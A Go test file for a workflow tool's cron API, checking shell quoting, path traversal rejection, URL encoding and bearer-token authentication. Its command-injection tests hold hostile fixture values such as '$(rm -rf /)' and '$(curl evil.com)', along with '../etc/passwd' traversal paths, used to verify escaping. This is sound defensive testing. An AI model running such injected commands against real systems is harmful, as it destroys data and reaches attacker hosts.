package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"testing"

	"github.com/beemflow/beemflow/storage"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestShellQuote tests the shell quoting function
func TestShellQuote(t *testing.T) {
	tests := []struct {
		input    string
		expected string
		desc     string
	}{
		{"simple", `'simple'`, "simple string"},
		{"with spaces", `'with spaces'`, "string with spaces"},
		{"with'quote", `'with'\''quote'`, "string with single quote"},
		{`with"doublequote`, `'with"doublequote'`, "string with double quote"},
		{"$(command)", `'$(command)'`, "command substitution attempt"},
		{"`backticks`", `'` + "`backticks`" + `'`, "backtick command substitution"},
		{"$variable", `'$variable'`, "variable expansion attempt"},
		{";semicolon", `';semicolon'`, "command separator"},
		{"&ampersand", `'&ampersand'`, "background execution"},
		{"|pipe", `'|pipe'`, "pipe character"},
		{"&&chain", `'&&chain'`, "command chaining"},
		{"||chain", `'||chain'`, "or chaining"},
		{">redirect", `'>redirect'`, "output redirect"},
		{"<redirect", `'<redirect'`, "input redirect"},
		{"2>&1", `'2>&1'`, "stderr redirect"},
		{"a'b'c'd'e", `'a'\''b'\''c'\''d'\''e'`, "multiple single quotes"},
		{"\n", `'` + "\n" + `'`, "newline character"},
		{"\r\n", `'` + "\r\n" + `'`, "carriage return and newline"},
		{"", `''`, "empty string"},
	}

	for _, tt := range tests {
		t.Run(tt.desc, func(t *testing.T) {
			got := ShellQuote(tt.input)
			assert.Equal(t, tt.expected, got)
		})
	}
}

// TestCronPathTraversal tests protection against path traversal attacks
func TestCronPathTraversal(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "cron_security_test")
	require.NoError(t, err)
	defer os.RemoveAll(tmpDir)

	// Create a valid workflow
	testFlow := `name: "test_workflow"
on: "schedule.cron"
steps: [{
	id: "test"
	use: "core.echo"
}]`

	flowPath := filepath.Join(tmpDir, "test_workflow.flow.cue")
	os.WriteFile(flowPath, []byte(testFlow), 0644)
	SetFlowsDir(tmpDir)

	op, exists := GetOperation("workflow_cron")
	require.True(t, exists)

	tests := []struct {
		path       string
		expectCode int
		desc       string
	}{
		{"/cron/test_workflow", http.StatusOK, "valid workflow"},
		{"/cron/test_workflow/", http.StatusOK, "trailing slash normalized"},
		{"/cron/test_workflow/extra", http.StatusBadRequest, "extra path segment"},
		{"/cron/../etc/passwd", http.StatusBadRequest, "path traversal attempt"},
		{"/cron/../../etc/passwd", http.StatusBadRequest, "multiple path traversal"},
		{"/cron/test/../workflow", http.StatusBadRequest, "path traversal in name"},
		{"/cron/./test_workflow", http.StatusOK, "dot normalized"},
		{"/cron/", http.StatusBadRequest, "empty workflow name"},
		{"/cron", http.StatusBadRequest, "no workflow name"},
		{"/cron//double//slash", http.StatusBadRequest, "double slashes"},
	}

	for _, tt := range tests {
		t.Run(tt.desc, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, tt.path, nil)
			w := httptest.NewRecorder()
			op.HTTPHandler(w, req)
			assert.Equal(t, tt.expectCode, w.Code, "Path: %s", tt.path)
		})
	}
}

// TestCronURLEncoding tests that flow names are properly URL encoded
func TestCronURLEncoding(t *testing.T) {
	manager := NewCronManager("http://localhost:3330", "test-secret")

	// We'll verify URL encoding directly without mocking exec.Command
	_ = manager // manager would be used in real cron entry generation

	testCases := []struct {
		flowName    string
		expectedURL string
		desc        string
	}{
		{"simple", "http://localhost:3330/cron/simple", "simple name"},
		{"with spaces", "http://localhost:3330/cron/with%20spaces", "name with spaces"},
		{"special!@#$%", "http://localhost:3330/cron/special%21@%23$%25", "special characters"},
		{"path/to/flow", "http://localhost:3330/cron/path%2Fto%2Fflow", "slash in name"},
		{"unicode-日本語", "http://localhost:3330/cron/unicode-%E6%97%A5%E6%9C%AC%E8%AA%9E", "unicode characters"},
	}

	for _, tc := range testCases {
		t.Run(tc.desc, func(t *testing.T) {
			// This would be called internally when building cron entries
			// We're testing that the URL is properly encoded
			encodedName := url.PathEscape(tc.flowName)
			actualURL := fmt.Sprintf("http://localhost:3330/cron/%s", encodedName)
			assert.Equal(t, tc.expectedURL, actualURL)
		})
	}
}

// TestCronCommandInjection tests protection against command injection
func TestCronCommandInjection(t *testing.T) {
	tests := []struct {
		serverURL  string
		cronSecret string
		flowName   string
		desc       string
	}{
		{
			serverURL:  "http://localhost:3330",
			cronSecret: "secret$(whoami)",
			flowName:   "test",
			desc:       "command injection in secret",
		},
		{
			serverURL:  "http://localhost:3330$(curl evil.com)",
			cronSecret: "secret",
			flowName:   "test",
			desc:       "command injection in server URL",
		},
		{
			serverURL:  "http://localhost:3330",
			cronSecret: "secret",
			flowName:   "test$(rm -rf /)",
			desc:       "command injection in flow name",
		},
		{
			serverURL:  "http://localhost:3330",
			cronSecret: "secret'||curl evil.com||'",
			flowName:   "test",
			desc:       "single quote injection in secret",
		},
	}

	for _, tt := range tests {
		t.Run(tt.desc, func(t *testing.T) {
			// Test that dangerous characters are safely escaped
			quotedSecret := ShellQuote("Authorization: Bearer " + tt.cronSecret)
			quotedURL := ShellQuote(tt.serverURL + "/cron/" + url.PathEscape(tt.flowName))

			// Verify that the quoted strings are safe
			// The single quote escaping should handle all dangerous input
			assert.Contains(t, quotedSecret, "'")
			assert.Contains(t, quotedURL, "'")

			// Specifically test the single quote injection case
			if tt.desc == "single quote injection in secret" {
				// The dangerous payload should be safely escaped
				assert.Contains(t, quotedSecret, "'\\''")
			}
		})
	}
}

// TestCronEndpoint tests the /cron endpoint functionality
func TestCron_GlobalEndpoint(t *testing.T) {
	// Create temp directory for test workflows
	tempDir, err := os.MkdirTemp("", "test-cron-*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	oldDir := flowsDir
	SetFlowsDir(tempDir)
	defer SetFlowsDir(oldDir)

	// Test workflows
	testFlows := []struct {
		name          string
		cue           string
		shouldTrigger bool
	}{
		{
			name: "scheduled_workflow",
			cue: `name: "scheduled_workflow"
on: "schedule.cron"
steps: [{
	id: "test"
	use: "core.echo"
	with: {
		text: "Scheduled task"
	}
}]`,
			shouldTrigger: true,
		},
		{
			name: "http_workflow",
			cue: `name: "http_workflow"
on: "http.request"
steps: [{
	id: "test"
	use: "core.echo"
	with: {
		text: "HTTP triggered"
	}
}]`,
			shouldTrigger: false,
		},
		{
			name: "multi_trigger_with_cron",
			cue: `name: "multi_trigger_with_cron"
on: ["schedule.cron", "http.request"]
steps: [{
	id: "test"
	use: "core.echo"
	with: {
		text: "Multi-trigger"
	}
}]`,
			shouldTrigger: true,
		},
	}

	// Create test workflow files
	for _, tf := range testFlows {
		filePath := filepath.Join(tempDir, tf.name+".flow.cue")
		if err := os.WriteFile(filePath, []byte(tf.cue), 0644); err != nil {
			t.Fatalf("Failed to write test flow %s: %v", tf.name, err)
		}
	}

	// Get cron operation
	cronOp, exists := GetOperation("system_cron")
	if !exists || cronOp.HTTPHandler == nil {
		t.Fatal("system_cron operation not found or has no HTTPHandler")
	}

	// Test the endpoint
	req := httptest.NewRequest(http.MethodPost, "/cron", nil)
	// Add storage to request context
	store := storage.NewMemoryStorage()
	req = req.WithContext(WithStore(req.Context(), store))
	w := httptest.NewRecorder()

	cronOp.HTTPHandler(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	// Parse response
	var response map[string]interface{}
	if err := json.NewDecoder(w.Body).Decode(&response); err != nil {
		t.Fatalf("Failed to decode response: %v", err)
	}

	// The new architecture processes schedules asynchronously
	// Just verify the endpoint responds correctly
	if status, ok := response["status"].(string); !ok || status != "completed" {
		t.Error("Expected status 'completed' in response")
	}

	// Verify structure exists (even if empty for new architecture)
	if _, ok := response["triggered"]; !ok {
		t.Error("Missing triggered count in response")
	}

	if _, ok := response["workflows"]; !ok {
		t.Error("Missing workflows in response")
	}

	// Note: The new cron system uses storage-based scheduling and async events
	// It doesn't immediately trigger workflows in the HTTP response
	// Testing actual workflow triggering would require integration tests
	// with a full event bus and storage setup
}

func TestCron_TriggerWorkflow(t *testing.T) {
	// Create temp directory with test workflow
	tmpDir, err := os.MkdirTemp("", "cron_test")
	require.NoError(t, err)
	defer os.RemoveAll(tmpDir)

	// Create a workflow with schedule.cron trigger
	testFlow := `name: "test_cron_workflow"
on: "schedule.cron"
cron: "0 9 * * *"

steps: [{
	id: "echo"
	use: "core.echo"
	with: {
		text: "Hello from cron!"
	}
}]`
	flowPath := filepath.Join(tmpDir, "test_cron_workflow.flow.cue")
	err = os.WriteFile(flowPath, []byte(testFlow), 0644)
	require.NoError(t, err)

	// Set flows directory
	SetFlowsDir(tmpDir)

	// Create request
	req := httptest.NewRequest(http.MethodPost, "/cron", bytes.NewReader([]byte("{}")))
	w := httptest.NewRecorder()

	// Get the operation handler
	op, exists := GetOperation("system_cron")
	require.True(t, exists)
	require.NotNil(t, op)
	require.NotNil(t, op.HTTPHandler)

	// Call handler
	op.HTTPHandler(w, req)

	// Check response
	assert.Equal(t, http.StatusOK, w.Code)

	var response map[string]interface{}
	err = json.Unmarshal(w.Body.Bytes(), &response)
	require.NoError(t, err)

	assert.Equal(t, "completed", response["status"])
	assert.NotNil(t, response["triggered"])
	assert.NotNil(t, response["workflows"])
}

func TestCron_SpecificWorkflow(t *testing.T) {
	// Create temp directory with test workflow
	tmpDir, err := os.MkdirTemp("", "cron_test")
	require.NoError(t, err)
	defer os.RemoveAll(tmpDir)

	// Create a workflow with schedule.cron trigger
	testFlow := `name: "specific_workflow"
on: "schedule.cron"
cron: "0 * * * *"

steps: [{
	id: "echo"
	use: "core.echo"
	with: {
		text: "Specific workflow triggered!"
	}
}]`
	flowPath := filepath.Join(tmpDir, "specific_workflow.flow.cue")
	err = os.WriteFile(flowPath, []byte(testFlow), 0644)
	require.NoError(t, err)

	// Set flows directory
	SetFlowsDir(tmpDir)

	// Create request for specific workflow
	req := httptest.NewRequest(http.MethodPost, "/cron/specific_workflow", nil)
	w := httptest.NewRecorder()

	// Get the operation handler
	op, exists := GetOperation("workflow_cron")
	require.True(t, exists)
	require.NotNil(t, op)
	require.NotNil(t, op.HTTPHandler)

	// Call handler
	op.HTTPHandler(w, req)

	// Check response
	assert.Equal(t, http.StatusOK, w.Code)

	var response map[string]interface{}
	err = json.Unmarshal(w.Body.Bytes(), &response)
	require.NoError(t, err)

	assert.Equal(t, "triggered", response["status"])
	assert.Equal(t, "specific_workflow", response["workflow"])
	assert.NotEmpty(t, response["run_id"])
}

func TestCron_ValidationError(t *testing.T) {
	// Create temp directory
	tmpDir, err := os.MkdirTemp("", "cron_test")
	require.NoError(t, err)
	defer os.RemoveAll(tmpDir)

	// Create a workflow WITHOUT schedule.cron trigger
	testFlow := `name: non_cron_workflow
on: http.request

steps:
  - id: echo
    use: core.echo
    with:
      text: "Not a cron workflow"
`
	flowPath := filepath.Join(tmpDir, "non_cron_workflow.flow.yaml")
	err = os.WriteFile(flowPath, []byte(testFlow), 0644)
	require.NoError(t, err)

	// Set flows directory
	SetFlowsDir(tmpDir)

	// Try to trigger non-cron workflow
	req := httptest.NewRequest(http.MethodPost, "/cron/non_cron_workflow", nil)
	w := httptest.NewRecorder()

	op, exists := GetOperation("workflow_cron")
	require.True(t, exists)
	require.NotNil(t, op)

	op.HTTPHandler(w, req)

	// Should get not found (endpoint not found)
	assert.Equal(t, http.StatusNotFound, w.Code)
}

func TestCron_ErrorHandling(t *testing.T) {
	// Create temp directory with test workflow
	tmpDir, err := os.MkdirTemp("", "cron_error_test")
	require.NoError(t, err)
	defer os.RemoveAll(tmpDir)

	// Create a workflow that will fail (missing required step)
	testFlow := `name: "failing_workflow"
on: "schedule.cron"
steps: [{
	id: "fail_step"
	use: "non.existent.tool"
}]`
	flowPath := filepath.Join(tmpDir, "failing_workflow.flow.cue")
	err = os.WriteFile(flowPath, []byte(testFlow), 0644)
	require.NoError(t, err)

	// Set flows directory
	SetFlowsDir(tmpDir)

	// Get cron operation
	cronOp, exists := GetOperation("system_cron")
	require.True(t, exists)

	// Test the endpoint
	req := httptest.NewRequest(http.MethodPost, "/cron", nil)
	store := storage.NewMemoryStorage()
	req = req.WithContext(WithStore(req.Context(), store))
	w := httptest.NewRecorder()

	cronOp.HTTPHandler(w, req)

	// Check response
	assert.Equal(t, http.StatusOK, w.Code)

	var response map[string]interface{}
	err = json.Unmarshal(w.Body.Bytes(), &response)
	require.NoError(t, err)

	// Should have errors for the failing workflow
	if errList, ok := response["errors"].([]interface{}); ok && len(errList) > 0 {
		// Good - we got errors as expected
		t.Logf("Got expected errors: %v", errList)
	} else {
		t.Error("Expected errors for failing workflow, but got none")
	}
}

func TestCron_Security(t *testing.T) {
	// Create temp directory
	tmpDir, err := os.MkdirTemp("", "cron_security")
	require.NoError(t, err)
	defer os.RemoveAll(tmpDir)

	// Create a workflow
	testFlow := `name: "secure_workflow"
on: "schedule.cron"
steps: [{
	id: "test"
	use: "core.echo"
}]`

	flowPath := filepath.Join(tmpDir, "secure_workflow.flow.cue")
	os.WriteFile(flowPath, []byte(testFlow), 0644)
	SetFlowsDir(tmpDir)

	// Set CRON_SECRET
	os.Setenv("CRON_SECRET", "test-secret-123")
	defer os.Unsetenv("CRON_SECRET")

	op, _ := GetOperation("system_cron")

	t.Run("NoAuth", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodPost, "/cron", nil)
		w := httptest.NewRecorder()
		op.HTTPHandler(w, req)
		assert.Equal(t, http.StatusUnauthorized, w.Code)
	})

	t.Run("WrongAuth", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodPost, "/cron", nil)
		req.Header.Set("Authorization", "Bearer wrong-secret")
		w := httptest.NewRecorder()
		op.HTTPHandler(w, req)
		assert.Equal(t, http.StatusUnauthorized, w.Code)
	})

	t.Run("CorrectAuth", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodPost, "/cron", nil)
		req.Header.Set("Authorization", "Bearer test-secret-123")
		w := httptest.NewRecorder()
		op.HTTPHandler(w, req)
		assert.Equal(t, http.StatusOK, w.Code)
	})
}
